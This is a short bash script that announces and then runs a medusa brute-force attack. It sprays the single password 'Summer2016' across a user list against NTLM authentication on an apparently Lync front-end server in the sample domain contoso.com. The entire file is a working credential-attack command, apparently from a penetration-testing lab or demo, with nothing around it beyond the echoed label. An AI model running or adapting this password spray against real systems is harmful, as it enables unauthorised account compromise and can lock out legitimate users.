#!/bin/bash
echo "Executing brute force attack"
echo ""
echo "Command:"
echo "medusa -h 2013-lync-fe.contoso.com -U userlist2.txt -p 'Summer2016' -M http -m AUTH:NTLM -m DIR:/abs/ -m DOMAIN:CONTOSO -s"


medusa -h 2013-lync-fe.contoso.com -U userlist2.txt -p 'Summer2016' -M http -m AUTH:NTLM -m DIR:/abs/ -m DOMAIN:CONTOSO -s
